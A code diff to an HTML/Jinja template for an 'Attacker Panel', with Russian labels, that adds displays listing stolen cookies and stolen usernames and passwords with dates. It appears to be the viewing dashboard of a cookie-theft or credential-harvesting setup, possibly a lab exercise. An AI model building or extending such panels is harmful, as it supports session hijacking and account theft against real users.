@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="CSS/style.css">
 </head>
 <body>
-
 <header>
     <h1>💀 Attacker Panel 💀</h1>
 </header>
@@ -15,19 +14,38 @@
 <div class="task-section">
     <h2>Лог украденных куки</h2>
     <button class="submit-btn" onclick="fetchCookies()">🔍 Обновить</button>
-    <div id="cookies-list" class="message-box">Нажмите "Обновить", чтобы загрузить куки.</div>
+    <div id="cookies-list" class="message-box">
+        {% if cookies %}
+            <b>🕵️‍♂️ Украденные куки:</b><br><br>
+            {% for cookie in cookies %}
+                <div class="cookie-item">
+                    <span class="cookie-icon">🍪</span> <code>{{ cookie[0] }}</code> <br>
+                    <span class="date-icon">📅</span> <b>Дата:</b> {{ cookie[1] }} <br>
+                </div>
+            {% endfor %}
+        {% else %}
+            Нажмите "Обновить", чтобы загрузить куки.
+        {% endif %}
+    </div>
+
+    <h2>Лог украденных учетных данных</h2>
+    <button class="submit-btn" onclick="fetchCredentials()">🔍 Обновить</button>
+    <div id="credentials-list" class="message-box">
+        {% if credentials %}
+            <b>🕵️‍♂️ Украденные учетные данные:</b><br><br>
+            {% for cred in credentials %}
+                <div class="credential-item">
+                    <span class="user-icon">👤</span> <strong>Username:</strong> {{ cred[0] }} <br>
+                    <span class="lock-icon">🔒</span> <strong>Password:</strong> {{ cred[1] }} <br>
+                    <span class="date-icon">📅</span> <b>Дата:</b> {{ cred[2] }} <br>
+                </div>
+            {% endfor %}
+        {% else %}
+            Нажмите "Обновить", чтобы загрузить учетные данные.
+        {% endif %}
+    </div>
 </div>
 
 <script src="JS/script.js"></script>
-
 </body>
 </html>
-
-
-
-
-
-
-
-
-
